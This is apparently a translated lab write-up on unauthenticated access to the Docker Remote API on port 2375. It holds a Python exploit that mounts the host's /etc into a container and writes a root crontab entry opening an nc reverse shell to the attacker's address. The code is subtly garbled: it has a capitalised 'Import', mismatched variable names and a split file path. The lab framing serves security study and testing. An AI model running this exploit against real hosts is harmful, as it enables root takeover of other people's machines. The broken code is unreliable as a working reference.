# docker daemon api Unauthorized Access Vulnerability

Reference link:

- http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6 %9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E %90%E5%92%8C%E5%88%A9%E7%94%A8

## vulnerability environment

Compile and start the vulnerability environment:

```
Docker-compose build
Docker-compose up -d
```

After the environment is started, it will listen to port 2375.

## Vulnerability recurrence

The method is that we can start a container at will, and mount the `/etc` directory of the host to the container, so that we can read and write files at will. We can write the command to the crontab configuration file to bounce the shell.

```python
Import docker

Client = docker.DockerClient(base_url='http://your-ip:2375/')
Data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp /etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

Write the crontab file and successfully bounce the shell:

![](1.png)